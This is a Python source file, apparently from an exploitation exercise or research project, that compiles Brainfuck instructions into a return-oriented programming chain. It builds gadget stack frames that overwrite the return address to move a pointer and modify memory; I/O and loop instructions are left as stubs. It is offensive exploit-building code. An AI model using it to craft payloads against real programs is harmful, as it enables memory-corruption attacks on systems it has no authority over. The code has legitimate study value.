from ast import Store
from gadgets import *

class BF_Parser():
    def __init__(self, bf_code):
        self.__bf_code = bf_code

        # get gadget objects
        self.__charger    = Charger()
        self.__copy_a3    = CopyA3()
        self.__restore_a3 = RestoreA3()

        self.__init_a3    = InitializeA3()
        self.__inc_a3     = IncrementA3()
        self.__load_s0    = LoadS0()
        self.__inc_s0     = IncrementS0()
        self.__store_s0   = StoreS0()

    def __construct_charger(self, ra=0, \
                                  s0=0, \
                                  s1=0, \
                                  s2=0, \
                                  s3=0, \
                                  s4=0, \
                                  s5=0, \
                                  s6=0, \
                                  s7=0, \
                                  s8=0, \
                                  s9=0, \
                                  s10=0, \
                                  s11=0 \
                            ):

        data = [s11, s10, s9, s8, s7, s6, s5, s4, s3, s2, s1, s0, ra]
        self.__charger.set_stack_frame(data)

    def __construct_copy_a3(self, ra=0, s0=0):
        data = [s0, ra]
        self.__copy_a3.set_stack_frame(data)

    def __construct_restore_a3(self, ra=0, s0=0, s1=0, s2=0):
        data = [s2, s1, s0, ra]
        self.__restore_a3.set_stack_frame(data)

    def get_payload_len(self):
        # return the number of bytes of the generated rop chain
        charger_frame_sz = 112
        write_mem_frame_sz = 16
        read_mem_frame_sz = 32

        total_len = 8 + charger_frame_sz # for the initialization

        for instruction in self.__bf_code:
            if instruction == '>' or instruction == '<':
                total_len += charger_frame_sz

            elif instruction == '+' or instruction == '-':
                total_len += 4 * charger_frame_sz + write_mem_frame_sz + read_mem_frame_sz

            elif instruction == '.':
                pass

            elif instruction == ',':
                pass

            elif instruction == '[':
                pass

            elif instruction == ']':
                pass

        return total_len

    def parse(self, pointer_start, backup_addr):
        # initialize a3 to point to the middle of the tape
        self.__construct_charger(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=pointer_start)

        rop_chain = self.__charger.print_vaddr() # charger address that overrides $ra
        rop_chain += self.__charger.print_gadget() # charger frame

        for instruction in self.__bf_code:
            if instruction == '>' or instruction == '<':
                increment = 0x8 if instruction == '>' else -0x8

                self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
                                         s1=increment, \
                                         s4=self.__charger.get_vaddr() \
                                        )
                rop_chain += self.__charger.print_gadget()

            elif instruction == '+' or instruction == '-':
                increment = 1 if instruction == '+' else -1

                self.__construct_charger(ra=self.__copy_a3.get_vaddr(), \
                                         s0=backup_addr, \
                                         s1=-0x60, \
                                         s4=self.__charger.get_vaddr() \
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_copy_a3(ra=self.__inc_a3.get_vaddr())
                rop_chain += self.__copy_a3.print_gadget()

                self.__construct_charger(ra=self.__load_s0.get_vaddr(), \
                                         s1=self.__charger.get_vaddr(), \
                                         s4=self.__inc_s0.get_vaddr(), \
                                         s11=increment \
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_charger(ra=self.__restore_a3.get_vaddr(), \
                                         s0=backup_addr, \
                                         s4=self.__store_s0.get_vaddr(), \
                                         s8=self.__charger.get_vaddr() - 0x6d6 \
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_restore_a3(ra=self.__inc_a3.get_vaddr(), \
                                            s1=-0x28 \
                                           )
                rop_chain += self.__restore_a3.print_gadget()

                self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
                                         s1=0x28, \
                                         s4=self.__charger.get_vaddr()
                                        )
                rop_chain += self.__charger.print_gadget()

            elif instruction == '.':
                pass

            elif instruction == ',':
                pass

            elif instruction == '[':
                pass

            elif instruction == ']':
                pass

        return rop_chain